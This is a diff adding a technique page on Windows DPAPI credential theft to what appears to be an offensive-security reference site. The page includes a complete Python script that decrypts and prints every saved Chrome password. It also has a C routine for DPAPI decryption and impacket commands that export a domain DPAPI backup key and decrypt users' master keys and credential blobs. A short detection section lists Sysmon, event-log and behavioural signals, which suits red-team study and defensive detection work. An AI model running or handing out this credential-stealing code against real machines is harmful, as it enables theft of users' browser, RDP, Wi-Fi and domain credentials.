@@ -1,0 +1,214 @@
+---
+title: DPAPI Credential Theft
+mitre: T1555.004
+category: credential-access
+group: Credential Stores
+summary: Decrypt DPAPI-protected blobs — browser passwords, RDP credentials, Wi-Fi keys — using the master key.
+platform: [Windows]
+tags: ['Python', 'C / C++', 'DPAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: locate DPAPI master key files
+    desc: Master keys live in %APPDATA%\Microsoft\Protect\<SID>\ — one file per encryption epoch.
+    dll: —
+  - call: CryptUnprotectData (same session)
+    desc: If running as the target user in an active session, Windows decrypts transparently.
+    dll: crypt32
+  - call: acquire domain backup key (offline path)
+    desc: Domain-joined machines backup master keys to the DC. Retrieve the domain DPAPI backup key with Mimikatz or lsadump.
+    dll: —
+  - call: decrypt master key, then blob
+    desc: Use the master key or the domain backup key to decrypt the target DPAPI blob offline.
+    dll: —
+detections:
+  - src: SYSMON EID 10
+    text: Cross-process access to lsass.exe to extract cached master keys or the domain DPAPI backup key.
+  - src: WINDOWS EID 4692
+    text: Backup of the DPAPI master key — logged when the master key escrow occurs to the DC.
+  - src: BEHAVIOURAL
+    text: dpapi::masterkey or dpapi::chrome commands in a process command line; or CryptUnprotectData called from a non-browser process on browser credential paths.
+  - src: FILE
+    text: Bulk read of %APPDATA%\Microsoft\Protect\ and browser Login Data files by a non-browser process.
+related:
+  - mitre: T1003.001
+    title: LSASS Memory Dump
+    desc: LSASS caches decrypted master keys in memory — dumping it is faster than offline decryption.
+    href: /techniques/credential-access/lsass-memory-dump
+  - mitre: T1555.003
+    title: Browser Credential Theft
+    desc: Chrome / Edge store credentials as DPAPI blobs — the most common DPAPI target.
+  - mitre: T1134.001
+    title: Token Impersonation
+    desc: Impersonating the target user lets you call CryptUnprotectData transparently.
+    href: /techniques/credential-access/token-impersonation
+labKit:
+  - label: dpapi_dump.py (impacket)
+    href: 'https://github.com/fortra/impacket'
+  - label: DonPAPI (automated Python toolkit)
+    href: 'https://github.com/login-securite/DonPAPI'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+The Data Protection API (DPAPI) is Windows's built-in secrets manager: applications call
+`CryptProtectData` to seal arbitrary bytes, and `CryptUnprotectData` to unseal them. The
+sealing key is derived from the user's password (and optionally an optional entropy value),
+stored as a **master key** in the user's profile.
+
+Attackers target DPAPI because almost every credential store on Windows uses it: Chrome, Edge,
+Firefox, RDP saved passwords, Wi-Fi keys, Outlook passwords, and the Windows Credential Manager.
+Compromising DPAPI gives access to all of these without cracking anything — just decrypting.
+
+<Callout type="note">
+  If you are running as the target user in their active session, `CryptUnprotectData` decrypts
+  DPAPI blobs transparently — no key material needed. The offline path (extracting master keys)
+  is only necessary when the user is not logged on or when operating from a different account.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### In-session decryption (C — same user, same session)
+
+<CodeBlock
+  file="dpapi_decrypt.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cwincrypt.h\u003e
+#pragma comment(lib, "crypt32.lib")
+
+// Decrypt a DPAPI blob in the current user's session
+// Windows handles master key lookup transparently
+BOOL dpapi_decrypt(const BYTE *blob, DWORD blob_len,
+                   BYTE **out, DWORD *out_len) {
+    DATA_BLOB cipher = { blob_len, (BYTE*)blob };
+    DATA_BLOB plain  = {0};
+
+    if (!CryptUnprotectData(&cipher,
+                            NULL,   // description
+                            NULL,   // optional entropy
+                            NULL,   // reserved
+                            NULL,   // no UI prompt
+                            0,
+                            &plain))
+        return FALSE;
+
+    *out     = plain.pbData;   // caller frees with LocalFree
+    *out_len = plain.cbData;
+    return TRUE;
+}`}
+/>
+
+### Chrome Login Data extraction (Python)
+
+<CodeBlock
+  file="chrome_passwords.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`import os, sqlite3, shutil, json, base64
+import win32crypt
+from Crypto.Cipher import AES
+
+def get_encryption_key():
+    """Extract Chrome's AES key (itself DPAPI-protected)."""
+    local_state_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData", "Local", "Google", "Chrome",
+        "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = json.load(f)
+    encrypted_key = base64.b64decode(
+        local_state["os_crypt"]["encrypted_key"])[5:]  # strip DPAPI prefix
+    # Decrypt the AES key with DPAPI
+    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+
+def decrypt_password(ciphertext, key):
+    """Decrypt a Chrome v10+ encrypted password."""
+    iv   = ciphertext[3:15]
+    ct   = ciphertext[15:]
+    cipher = AES.new(key, AES.MODE_GCM, iv)
+    return cipher.decrypt(ct)[:-16].decode()  # strip GCM tag
+
+def dump_chrome_passwords():
+    db_path = os.path.join(
+        os.environ["USERPROFILE"],
+        "AppData", "Local", "Google", "Chrome",
+        "User Data", "Default", "Login Data")
+    tmp = db_path + ".tmp"
+    shutil.copy2(db_path, tmp)   # copy because Chrome locks the original
+
+    key  = get_encryption_key()
+    conn = sqlite3.connect(tmp)
+    for url, user, pw in conn.execute(
+            "SELECT origin_url, username_value, password_value FROM logins"):
+        if pw[:3] == b'v10':
+            pw = decrypt_password(pw, key)
+        print(f"{url} | {user} | {pw}")
+    conn.close()
+    os.remove(tmp)
+
+dump_chrome_passwords()`}
+/>
+
+### Offline master key decryption (impacket)
+
+<CodeBlock
+  file="offline_dpapi.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Collect master key files and SYSTEM/SECURITY hives from the target
+# (or use secretsdump to get the domain DPAPI backup key)
+
+# 1. Get the domain DPAPI backup key (requires Domain Admin)
+$ python3 dpapi.py backupkeys --export -t corp.local/Administrator:Password1@dc01
+
+# 2. Decrypt user master key with domain backup key
+$ python3 dpapi.py masterkey \
+    -file MK_{guid} \
+    -pvk domain_backup.pvk
+
+# 3. Decrypt a DPAPI blob using the decrypted master key
+$ python3 dpapi.py credential \
+    -file "C:/Users/jsmith/AppData/Local/Microsoft/Credentials/{blob}" \
+    -key <masterkey_hex>`}
+/>
+
+## What DPAPI protects
+
+| Application | Protected data | Blob location |
+|---|---|---|
+| Chrome / Edge | Saved passwords, cookies, payment info | `%LOCALAPPDATA%\Google\Chrome\...` |
+| Internet Explorer / Edge Legacy | Saved passwords | `%LOCALAPPDATA%\Microsoft\Credentials\` |
+| RDP Client | Saved server passwords | `%LOCALAPPDATA%\Microsoft\Credentials\` |
+| Windows Credential Manager | Generic / Windows credentials | `%LOCALAPPDATA%\Microsoft\Credentials\` |
+| Wi-Fi passwords | WPA pre-shared keys | `%PROGRAMDATA%\Microsoft\Wlansvc\Profiles\` |
+| Outlook | SMTP/IMAP account passwords | Registry under `HKCU\Software\Microsoft\Office` |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The domain DPAPI backup key is the most impactful target: it decrypts any master key in the
+domain, past and present. EID 4692 is generated when this key is escrowed and should be part of
+any domain controller alert baseline.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
